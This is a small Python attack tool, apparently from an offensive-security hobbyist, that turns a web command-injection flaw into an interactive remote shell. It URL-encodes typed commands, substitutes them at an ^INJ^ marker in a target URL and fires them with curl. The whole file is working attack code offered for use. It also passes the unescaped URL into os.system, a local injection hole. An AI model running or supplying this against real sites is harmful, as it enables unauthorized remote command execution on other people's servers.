#!/bin/python3

# a universal RCE implementation
# use with rlwrap for bonus points
# replaces the previous bash version of this, now its python!
# still uses bash for cURL calls
# all encoding done within script now, more reliable, cleaner code (imo)
#
# certain senarios still give issues but 90% there
# 
# --iamgroot

import sys
import os

if (len(sys.argv) < 2):
	print("Usage: urlencode.py <full URL including vulnerable parameter and ^INJ^ to mark injection point>")
	print("Uses linux cURL")
	print("Use with rlwrap for bonus points!")
	print("Use: \"exit\" to exit")
	print("eg. http://192.168.123.456/thispage/thatpage.php?cmd=^INJ^")
	sys.exit(0)


def encode(unparsed):
	encoded=unparsed	
	encoded=encoded.replace("%", "%25")
	encoded=encoded.replace(" ", "%20")
	encoded=encoded.replace("!", "%21")
	encoded=encoded.replace("@", "%40")
	encoded=encoded.replace("#", "%23")
	encoded=encoded.replace("$", "%24")
	encoded=encoded.replace("^", "%5E")
	encoded=encoded.replace("&", "%26")
	encoded=encoded.replace("*", "%2A")
	encoded=encoded.replace("(", "%28")
	encoded=encoded.replace(")", "%29")
	encoded=encoded.replace("-", "%2D")
	encoded=encoded.replace("=", "%3D")
	encoded=encoded.replace("+", "%2B")
	encoded=encoded.replace(",", "%2C")
	encoded=encoded.replace(".", "%2E")
	encoded=encoded.replace("/", "%2F")
	encoded=encoded.replace("\\", "%5C")
	encoded=encoded.replace("~", "%7E")
	encoded=encoded.replace("`", "%60")
	encoded=encoded.replace("'", "%27")
	encoded=encoded.replace("\"", "%22")
	encoded=encoded.replace(";", "%3B")
	encoded=encoded.replace(":", "%3A")
	encoded=encoded.replace("|", "%7C")
	encoded=encoded.replace("<", "%3C")
	encoded=encoded.replace(">", "%3E")
	encoded=encoded.replace("[", "%5B")
	encoded=encoded.replace("]", "%5D")
	encoded=encoded.replace("{", "%7B")
	encoded=encoded.replace("}", "%7D")
	encoded=encoded.replace("_", "%5F")
	encoded=encoded.replace("?", "%3F")
	return encoded

rawsite=sys.argv[1]
rawcmd=""

while (rawcmd != "exit"):
	rawcmd=input("uni-rce> ")
	if (rawcmd == "exit"):
		sys.exit(0)
	cmd=encode(rawcmd)
	site=rawsite.replace("^INJ^", cmd)
	os.system("curl -o - " + site) # added -o - to allow binary, should i?
